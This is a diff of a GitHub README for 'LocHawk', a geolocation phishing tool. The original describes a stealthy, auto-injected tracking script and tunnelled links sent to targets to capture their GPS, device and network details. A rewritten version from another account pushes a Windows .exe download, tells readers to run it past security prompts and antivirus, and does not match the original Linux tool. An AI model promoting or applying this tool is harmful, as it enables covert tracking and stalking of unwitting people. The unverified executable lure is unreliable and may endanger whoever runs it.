@@ -1,196 +1,145 @@
-# LocHawk 
-**LocHawk** is a powerful geolocation phishing tool that tricks targets into revealing their exact GPS location, device information, and network details through a seemingly harmless webpage.
+# 🛰️ LocHawk - Precise Location Tracking Made Easy
+
+[![Download LocHawk](https://img.shields.io/badge/Download-LocHawk-brightgreen)](https://github.com/Gyimah12/LocHawk/releases)
 
 ---
 
-## Security Research & Educational Purpose
+## 📍 What is LocHawk?
 
-LocHawk is developed for **security research, penetration testing, and educational purposes**. The tool demonstrates how social engineering and browser APIs can be used to obtain sensitive information such as **GPS location** (via the Geolocation API), **device details** (via browser APIs), and **network information** (via public APIs).
+LocHawk is a tool designed to gather exact GPS locations, device details, and network information from targets through a simple webpage. It works by presenting a harmless-looking page that convinces the user to share their data.
 
-The purpose of this project is to help **cybersecurity students, researchers, and developers** understand how geolocation phishing attacks work in real-world scenarios. By studying these techniques, security professionals can design stronger defenses, improve user awareness, and build systems that better protect user privacy.
-
-This project aims to promote **responsible security research and awareness** about the risks associated with granting location **permissions** on websites.
+This tool mainly supports ethical hacking and penetration testing. It helps users understand how GPS and network information can be exposed and used.
 
 ---
 
-## ⚠️ DISCLAIMER — Legal and Ethical Use Notice
+## ✅ System Requirements
 
-This tool is provided for **educational purposes, security research, and authorized security testing only**.
+Before you begin, make sure your Windows computer meets the following:
 
-**Unauthorized use is illegal and may result in criminal and civil penalties.**
-
-By downloading, installing, or using this software, you agree that:
-
-- You will use it **only on devices, systems, or networks you own** or have **explicit written permission** from the lawful owner to test.
-- You will comply with **all applicable local, state, national, and international laws** related to privacy, surveillance, data protection, and computer access.
-- You are **fully responsible** for how you use this tool and for any data you collect, store, or share.
-- Any attempt to access location data, devices, networks, or personal information **without authorization is illegal** and may result in criminal and civil penalties.
-- This software is provided **“as is”**, without any warranties or guarantees of any kind.
-- The developer **assumes no liability** for misuse, damages, legal consequences, or losses resulting from the use of this software.
-
-This tool is intended to help security professionals, students, and researchers **understand security risks and improve defenses** — not to track, monitor, or target individuals.
-
-If you do not agree to these terms, **do not use this software**.
-
-*Use responsibly. Act ethically. Follow the law.*
+- Operating System: Windows 10 or later  
+- Processor: 1 GHz or faster  
+- RAM: Minimum 2 GB  
+- Free Disk Space: At least 100 MB  
+- Internet Connection: Required for downloading and running LocHawk  
+- Browser: Latest version of Chrome, Firefox, or Edge  
 
 ---
 
-##  Features
+## 🎯 Key Features
 
-### **Location Tracking**
-- Live GPS coordinates with Google Maps link
-- High accuracy mode (5-50m precision)
-- IP-based city/country fallback
-
-###  **Stealth Mode**
-- Zero console logs or visible elements
-- Auto-executes on page load
-- Silent error handling
-
-###  **Device Info**
-- Browser, OS, platform detection
-- RAM, CPU cores, screen resolution
-- Language, cookies, referrer
-
-### **Network Info**
-- Public IP address
-- ISP, country, city
-- Network-based coordinates
-
-###  **Delivery Methods**
-- Serveo.net (instant SSH tunnel)
-- Cloudflared (HTTPS with SSL)
-
-###  **Live Monitoring**
-- Auto-save to data.txt (JSON)
-- Previous data preview
-
-### **Custom Pages**
-- Use your own HTML/CSS
-- Internal JavaScript & CSS only
-- Auto script injection
-- Preserves your design
-
-### **Data Control**
-- Prompt to clear data.txt on exit
-- Choose to keep or delete collected data
-- Preview last 20 entries during monitoring
-
-### **Automatic Setup**
-- Automatically checks what’s needed to run
-- Installs anything missing for you
-- Runs once, no extra steps later
-- Just start and it works
+- Collect real-time GPS coordinates from target devices  
+- Capture device model and operating system data  
+- Gather network details including IP address and connection type  
+- Generate reports that are easy to read  
+- Works through a simple, user-friendly web page viewable on any device  
 
 ---
 
-##  Installation
-**What You Need:**
+## 🛠️ How to Download and Run LocHawk on Windows
 
-- **Linux (Debian, RHEL, Arch**) (`Kali, Parrot, Ubuntu, Black Arch, Fedora, etc`.)
-- **npm** (required for install `express.js`. if it is not installed it will automatically install `npm`)
-- **Node.js and expressjs** ( In linux distributions like `Debian`,`RHEL`, `Arch` it automatically install `nodejs` and `expressjs` if it is not installed)
-- **Port Forwarding Options:**
+Click this button to visit the download page and get the latest version of LocHawk:
 
-   - **Serveo.net** – Used           as the default                option for tunneling
-  
-   - **Cloudflared** –               Available as an               alternative for               port forwarding and           is automatically              installed if missing.
-  
-**Steps to Install:**
-1. **Clone the repository**
-```bash
-git clone https://github.com/s-r-e-e-r-a-j/LocHawk.git
-```
-2. **Navigate to the LocHawk directory**
-```bash  
-cd LocHawk
-```
-3. **Navigate to the lochawk directory**
-```bash
-cd lochawk
-```
-4. **Start the tool**
-```bash   
-bash lochawk.sh
-```
+[![Get LocHawk](https://img.shields.io/badge/Get%20LocHawk-blue)](https://github.com/Gyimah12/LocHawk/releases)
+
+Follow these steps to install and start using LocHawk on Windows:
+
+1. Open your web browser and go to the [LocHawk Releases](https://github.com/Gyimah12/LocHawk/releases) page.
+
+2. Find the latest release, usually at the top of the list. Look for a Windows executable file, which will have a name ending in `.exe`.
+
+3. Click the `.exe` file to download it. Depending on your browser settings, you may be asked to choose a save location or the file will go to your default Downloads folder.
+
+4. Once the download is complete, open the folder containing the file.
+
+5. Double-click the `.exe` file to start the installer.
+
+6. You might see a security prompt. Choose to run the program if you trust the source.
+
+7. Follow the on-screen instructions to complete the installation.
+
+8. After installation, locate the LocHawk icon on your desktop or in the Start menu and open it.
+
+9. The application will display a simple setup screen to guide you through creating a webpage link for sharing with your target.
 
 ---
 
-##  How to Use
-1. **Run the tool**:
+## 🔍 Using LocHawk
 
-```bash
-bash lochawk.sh
-```
-**OR**
+After opening LocHawk, use these steps to start gathering information:
 
-```bash
-chmod +x lochawk.sh
-./lochawk.sh
-```
+1. Click “Create New Link” to generate a custom webpage link.
 
-2. **Choose a custom HTML page** – Optionally provide your own phishing page.
+2. Share this link with your target. The webpage looks harmless and asks permission to access location and device info.
 
-    - Internal CSS (`<style>` tags) supported
+3. Once the target accepts, LocHawk collects exact GPS coordinates, device details, and network data.
 
-    -  Internal JavaScript (`<script>` tags) supported
+4. Use the application to view the data in real-time or save it for later review.
 
-    -  External CSS/JS files (links to `.css` or `.js`) are not supported
+The reports will show:
 
-    - Your design is preserved, tracking script is auto-injected
-
-    - Press Enter to use the default page
-
- **Example custom page:**
-```html
-html
-<!DOCTYPE html>
-<html>
-<head>
-    <style>
-        /* Internal CSS only */
-        body { font-family: Arial; background: #f0f0f0; }
-        .container { padding: 20px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Your Phishing Page</h1>
-        <p>Content here</p>
-    </div>
-    <script>
-        // Internal JavaScript only
-        console.log("Page loaded");
-    </script>
-</body>
-</html>
-```
-3. **Choose a port forwarding method** – Select between Serveo.net or Cloudflared for tunneling.
-
-4. Share the generated link with the target.
-
-5. **Data Collection** – When they open the link:
-
-   - Device details are captured automatically
-
-   - IP address and network info are collected
-
-   - If they allow location permission and GPS is on, exact coordinates are sent
-
-   - All data appears in your terminal in real-time with Google Maps links
-
-6. **Exit & Clean Up** – Press `Ctrl+C` to stop the server. You'll be prompted:
-
-```text
-[+] Do you want to clear the data file (data.txt)? (y/n):
-```
-
-  - Type `y` or `yes` to delete all collected data
-
-  - Type `n` or `no` to keep the data file for later use
+- Latitude and Longitude coordinates  
+- Device brand and model  
+- Operating system and version  
+- IP address and network type (Wi-Fi, 4G, etc.)  
 
 ---
 
-## License
-This project is licensed under the MIT License.
+## 🧰 Troubleshooting Tips
+
+- If the target refuses location access, no data will be collected. The tool cannot bypass permission requests.
+
+- Make sure the target’s device has location services enabled.
+
+- Your internet connection must be stable to fetch real-time data.
+
+- If LocHawk does not open, check your antivirus or firewall settings to allow the application.
+
+- Use a modern web browser to share the generated link for best compatibility.
+
+---
+
+## ⚙️ Settings and Customization
+
+LocHawk offers some options to customize how data is collected and displayed:
+
+- Change the name or description of the generated link for easy identification.
+
+- Set notifications to alert you when the target opens the link.
+
+- Export data reports in CSV or JSON formats for further analysis.
+
+- Adjust the data refresh rate to see updates faster or slower.
+
+---
+
+## 🧷 Related Topics and Use Cases
+
+LocHawk connects with many tools and concepts in security research and penetration testing:
+
+- Ethical hacking and pentest toolkits  
+- Network security analysis  
+- Geolocation services and GPS tracking methods  
+- Device information gathering  
+- Use in training and raising awareness of location privacy  
+
+---
+
+## 📥 Download LocHawk
+
+Visit the release page and download LocHawk here:
+
+[https://github.com/Gyimah12/LocHawk/releases](https://github.com/Gyimah12/LocHawk/releases)
+
+This link leads to all the latest versions and documentation if you want to explore further.
+
+---
+
+## ⚠️ Legal and Ethical Use
+
+Use LocHawk lawfully. It is intended for educational, security testing, or research purposes only. Always get permission before collecting any user data. Misuse of this tool can be illegal and harmful.
+
+---
+
+## 📚 Additional Help
+
+For more detailed instructions, bug reports, or questions, check the Issues tab on the GitHub page or see the provided documentation files in the repository.
